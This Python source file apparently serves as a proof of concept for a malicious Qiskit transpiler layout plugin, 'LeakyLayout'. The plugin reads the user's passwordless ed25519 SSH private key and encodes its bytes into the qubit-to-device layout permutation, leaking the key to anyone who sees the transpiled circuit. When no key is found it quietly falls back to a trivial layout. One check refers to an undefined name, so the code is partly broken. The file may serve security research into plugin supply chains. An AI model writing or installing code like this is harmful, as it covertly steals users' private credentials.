from __future__ import annotations

from pathlib import Path

import gmpy2
from cryptography.hazmat.primitives.serialization import load_ssh_private_key
from qiskit.transpiler import PassManager
from qiskit.transpiler.basepasses import AnalysisPass
from qiskit.transpiler.exceptions import TranspilerError
from qiskit.transpiler.layout import Layout
from qiskit.transpiler.passmanager_config import PassManagerConfig
from qiskit.transpiler.preset_passmanagers import common
from qiskit.transpiler.preset_passmanagers.plugin import PassManagerStagePlugin
from qiskit.transpiler.target import Target


def ssh_private_key_to_bytes():
    """
    Tries to read the OpenSSH key in the default path for ed25519 keys.
    If the private key is password protected or if it doesn't exit, it
    returns None.
    """
    key_path = Path.home() / ".ssh" / "id_ed25519"

    if not key_path.is_file():
        return None

    with open(key_path, "rb") as f:
        key = f.read()
    try:
        # TODO: this only works with keys not protected with password
        # Can we extend this to encrypted ones?
        private_key = load_ssh_private_key(key, password=None)
    except ValueError:
        return None

    return private_key.private_bytes_raw()


def index_to_permutation(index_permutation, size_alphabet):
    """
    Returns the (lexicographical ordered) i-th permutation for a set of size_alphabet elements
    """
    assert index_permutation < gmpy2.fac(size_alphabet)

    factorials = [1]
    permutation = []

    # Precompute factorials
    for k in range(1, size_alphabet):
        factorials.append(int(gmpy2.fac(k)))

    # Compute permutation
    for k in range(size_alphabet):
        permutation.append(index_permutation // factorials[size_alphabet - 1 - k])
        index_permutation %= factorials[size_alphabet - 1 - k]

    # Readjust permutation
    for k in range(size_alphabet - 1, 0, -1):
        for j in range(k - 1, -1, -1):
            if permutation[j] <= permutation[k]:
                permutation[k] += 1

    return permutation


def compute_permutation(number_qubits):
    key = ssh_private_key_to_bytes()
    if key is None:
        return None

    index = int.from_bytes(key)
    return index_to_permutation(index, number_qubits)


class LeakyLayout(AnalysisPass):
    """
    Choose a Layout by assigning ``n`` circuit qubits to device qubits in a way that this
    mapping encodes the bytes of the default OpenSSH private key from the server executing
    the transpilation. If there is no such key, it fallbacks to TrivialLayout.

    The attack requires a minimum of 58 physical qubits.

    It uses as many ancilla qubits as needed to reach the minimum number of qubits.
    """

    def __init__(self, coupling_map):
        """
        LeakyLayout initializer.

        Args:
            coupling_map (Union[CouplingMap, Target]): directed graph representing a coupling map.

        Raises:
            TranspilerError: if invalid options
        """
        super().__init__()

        if isinstance(coupling_map, Target):
            self.target = coupling_map
            self.coupling_map = self.target.build_coupling_map()
        else:
            self.target = None
            self.coupling_map = coupling_map

    def run(self, dag):
        """
        Run the LeakyLayout pass on `dag`.

        Args:
            dag (DAGCircuit): DAG to find layout for.

        Raises:
            TranspilerError: if dag wider than the target backend
        """
        if self.target is not None:
            if dag.num_qubits() > self.target.num_qubits:
                raise TranspilerError("Number of qubits greater than device.")
            if target.num_qubits() < 58:
                raise TranspilerError(
                    "Target number of qubits must be greater than 58."
                )

        elif dag.num_qubits() > self.coupling_map.size():
            raise TranspilerError("Number of qubits greater than device.")

        elif self.coupling_map.size() < 58:
            raise TranspilerError("Target number of qubits must be greater than 58.")


        permutation = compute_permutation(max(dag.num_qubits(), 58))

        # If there is no passwordless OpenSSH or anything else, fallback to trivial layout
        if permutation is None:
            self.property_set["layout"] = Layout.generate_trivial_layout(
                *(dag.qubits + list(dag.qregs.values()))
            )
        else:
            # Our attack
            self.property_set["layout"] = Layout.from_intlist(
                permutation, *(list(dag.qregs.values()))
            )


class LeakyLayoutPlugin(PassManagerStagePlugin):
    def pass_manager(
        self,
        pass_manager_config: PassManagerConfig,
        optimization_level: int | None = None,
    ) -> PassManager:
        layout_pm = PassManager(
            [LeakyLayout(coupling_map=pass_manager_config.coupling_map)]
        )
        layout_pm += common.generate_embed_passmanager(pass_manager_config.coupling_map)
        return layout_pm
